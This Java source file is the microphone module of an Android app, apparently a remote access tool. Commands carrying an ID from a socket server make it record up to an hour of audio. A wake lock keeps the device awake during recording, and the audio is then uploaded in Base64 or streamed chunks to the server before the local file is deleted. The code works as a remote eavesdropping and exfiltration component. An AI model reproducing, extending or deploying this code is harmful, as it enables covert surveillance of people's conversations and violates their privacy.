package com.fason.app.features.mic;

import android.Manifest;
import android.content.Context;
import android.content.pm.ServiceInfo;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Base64;
import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import com.fason.app.core.network.TransferHelper;
import com.fason.app.core.permissions.PermissionManager;
import com.fason.app.service.MainService;
import org.json.JSONObject;
import java.io.File;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

public final class MicManager {
    private static volatile MediaRecorder recorder;
    private static volatile File audioFile;
    private static final Handler handler = new Handler(Looper.getMainLooper());
    private static final ExecutorService exec = Executors.newSingleThreadExecutor();
    private static final AtomicBoolean recording = new AtomicBoolean(false);
    private static Runnable stopTask;
    private static volatile String currentCmdId = null;
    private static volatile PowerManager.WakeLock recWakeLock;
    private MicManager() {}
    public static boolean isRecording() {
        return recording.get();
    }

    public static void start(int seconds, String cmdId) {
        if (seconds <= 0 || seconds > 3600) {
            sendError("Invalid duration: " + seconds, cmdId);
            return;
        }
        if (!PermissionManager.canIUse(Manifest.permission.RECORD_AUDIO)) {
            sendError("No mic permission", cmdId);
            return;
        }
        stop(null);
        if (!recording.compareAndSet(false, true)) return;
        currentCmdId = cmdId;
        acquireRecWakeLock();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            MainService svc = MainService.getInstance();
            if (svc != null) svc.updateType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        }

        try {
            File cache = FasonApp.getContext().getCacheDir();
            if (cache == null) {
                recording.set(false);
                releaseRecWakeLock();
                return;
            }
            audioFile = File.createTempFile("rec_", ".mp4", cache);
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioEncodingBitRate(128000);
            recorder.setAudioSamplingRate(44100);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            final String stopCmdId = cmdId;
            final int finalSeconds = seconds;
            stopTask = () -> {
                stop(stopCmdId);
                sendStatus("stopped", finalSeconds, stopCmdId);
            };
            handler.postDelayed(stopTask, seconds * 1000L);
            sendStatus("recording", seconds, cmdId);
        } catch (Exception e) {
            recording.set(false);
            releaseRecWakeLock();
            sendError("Recording failed: " + e.getMessage(), cmdId);
            releaseType();
            if (audioFile != null) { audioFile.delete(); audioFile = null; }
        }
    }

    public static void stop(String cmdId) {
        if (stopTask != null) {
            handler.removeCallbacks(stopTask);
            stopTask = null;
        }
        final File fileToSend;
        try {
            if (recorder != null) {
                try { recorder.stop(); } catch (Exception ignored) {}
                recorder.release();
                recorder = null;
            }
        } catch (Exception ignored) {} finally {
            fileToSend = audioFile;
            audioFile = null;
        }

        recording.set(false);
        releaseType();
        releaseRecWakeLock();
        if (cmdId != null && fileToSend != null) {
            final String finalCmdId = cmdId;
            sendStatus("stopped", 0, finalCmdId);
            exec.execute(() -> sendAudioFile(fileToSend, finalCmdId));
        } else if (fileToSend != null) {
            fileToSend.delete();
        }
        if (cmdId != null && currentCmdId != null && currentCmdId.equals(cmdId)) {
            currentCmdId = null;
        }
    }

    private static void releaseType() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            MainService svc = MainService.getInstance();
            if (svc != null) svc.releaseType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        }
    }

    private static void acquireRecWakeLock() {
        try {
            if (recWakeLock == null) {
                PowerManager pm = (PowerManager) FasonApp.getContext().getSystemService(Context.POWER_SERVICE);
                if (pm != null) {
                    recWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "fason:mic_rec");
                    recWakeLock.setReferenceCounted(false);
                }
            }
            if (recWakeLock != null && !recWakeLock.isHeld()) {
                recWakeLock.acquire(65 * 60 * 1000L);
            }
        } catch (Exception ignored) {}
    }

    private static void releaseRecWakeLock() {
        try {
            if (recWakeLock != null && recWakeLock.isHeld()) {
                recWakeLock.release();
            }
        } catch (Exception ignored) {}
    }

    private static void sendAudioFile(File fileToSend, String cmdId) {
        try {
            if (fileToSend == null || !fileToSend.exists()) {
                sendError("Audio file not found", cmdId);
                return;
            }

            if (TransferHelper.shouldChunk(fileToSend.length())) {
                JSONObject meta = new JSONObject();
                meta.put(Protocol.KEY_FILE, true);
                meta.put(Protocol.KEY_NAME, fileToSend.getName());
                meta.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                attachCmdId(meta, cmdId);
                TransferHelper.streamFile(
                    SocketClient.getInstance().getSocket(),
                    Protocol.MIC, fileToSend, meta);
            } else {
                byte[] data = TransferHelper.readSmallFile(fileToSend);
                if (data == null) { sendError("Read failed", cmdId); return; }
                JSONObject obj = new JSONObject();
                obj.put(Protocol.KEY_FILE, true);
                obj.put(Protocol.KEY_NAME, fileToSend.getName());
                obj.put(Protocol.KEY_BUFFER, Base64.encodeToString(data, Base64.NO_WRAP));
                obj.put(Protocol.KEY_SIZE, data.length);
                obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                attachCmdId(obj, cmdId);
                SocketClient.getInstance().getSocket().emit(Protocol.MIC, obj);
            }

        } catch (Exception e) {
            sendError("Send failed: " + e.getMessage(), cmdId);
        } finally {
            if (fileToSend != null) {
                fileToSend.delete();
            }
        }
    }

    private static void sendStatus(String status, int duration, String cmdId) {
        try {
            JSONObject obj = new JSONObject();
            obj.put(Protocol.KEY_STATUS, status);
            obj.put(Protocol.KEY_DURATION, duration);
            obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            attachCmdId(obj, cmdId);
            SocketClient.getInstance().getSocket().emit(Protocol.MIC, obj);
        } catch (Exception ignored) {}
    }

    private static void sendError(String error, String cmdId) {
        try {
            JSONObject obj = new JSONObject();
            obj.put(Protocol.KEY_ERROR, error);
            obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            attachCmdId(obj, cmdId);
            SocketClient.getInstance().getSocket().emit(Protocol.MIC, obj);
        } catch (Exception ignored) {}
    }

    private static void attachCmdId(JSONObject obj, String cmdId) {
        if (cmdId != null && !cmdId.isEmpty()) {
            try { obj.put(Protocol.KEY_CMD_ID, cmdId); } catch (Exception ignored) {}
        }
    }
}
